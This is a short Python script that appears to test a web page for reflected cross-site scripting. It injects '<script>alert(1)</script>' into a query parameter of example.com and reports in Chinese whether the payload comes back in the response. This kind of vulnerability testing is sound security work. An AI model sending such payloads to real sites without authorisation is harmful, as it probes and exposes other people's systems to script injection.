
```
import requests

target_url = 'http://example.com'
payload = '<script>alert(1)</script>'

url = target_url + '?q=' + payload
response = requests.get(url)

if payload in response.text:
    print('XSS漏洞存在！')
else:
    print('XSS漏洞不存在！')
```